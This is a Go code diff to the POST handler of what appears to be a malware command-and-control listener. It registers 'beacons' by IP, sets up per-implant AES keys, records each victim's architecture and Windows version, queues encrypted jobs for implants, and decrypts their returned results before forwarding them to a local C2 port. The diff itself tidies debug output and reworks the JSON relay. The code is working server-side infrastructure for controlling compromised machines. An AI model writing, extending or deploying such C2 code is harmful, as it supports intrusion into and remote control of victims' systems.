@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"reflect"
+	"strconv"
 	"strings"
 )
 
@@ -53,12 +54,8 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
 	domain := r.Host
 
-	println("1")
-
 	for i, beacon := range listener.Beacons {
 		if beacon.Ip == ip && beacon.AESkey == "" && beacon.Arch == "" {
-
-			println("2")
 
 			var CusAes big.Int
 			CusAes.SetBytes(ReverseBytes(GetBytes(body, 16)))
@@ -88,7 +85,7 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			listener.Beacons[i].Arch = mtdt["arch"]
 			listener.Beacons[i].System = mtdt["wver"]
 
-			println("saving xml")
+			println("Saving Xml File :)")
 			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)
 
 			return res, true
@@ -105,16 +102,40 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 				} else {
 					res = append(res, make_fucker(listener, i)...)
 					res = eAES.EncryptData(res)
-					return ReverseBytes(res), true
+					return res, true
 				}
 			} else {
-				json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
+				json_byte, err := eAES.DecryptData(GetBytes(body, len(body)))
+				if !err {
+					println("not de ")
+				}
 				remove_job(listener, i)
-				json_byte = append(json_byte, 0x00, IntToUint8(i))
-				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
-				res = append(res, make_fucker(listener, i)...)
-				res = eAES.EncryptData(res)
-				return res, true // commit
+
+				var jsonObj map[string]interface{}
+
+				json_byte = []byte(strings.Replace(string(json_byte), "\n", "\\n", -1))
+				json_byte = []byte(strings.Replace(string(json_byte), "\t", "\\t", -1))
+
+				er := json.Unmarshal(json_byte, &jsonObj)
+				if er != nil {
+					fmt.Println("Error unmarshalling JSON:", er)
+				}
+
+				jsonObj["c2"] = strconv.Itoa(i)
+				newJsonStr, _ := json.Marshal(jsonObj)
+				json_byte = append(newJsonStr)
+
+				println(string(json_byte))
+
+				Send_Bytes_to(w, json_byte, "http://localhost:"+strconv.Itoa(int(CONFIG.C2port-1))+"/c2", expectedHeaders)
+
+				if is_jobs_null(listener, i) {
+					return res, true // sleep
+				} else {
+					res = append(res, make_fucker(listener, i)...)
+					res = eAES.EncryptData(res)
+					return res, true
+				}
 			}
 
 		} else {
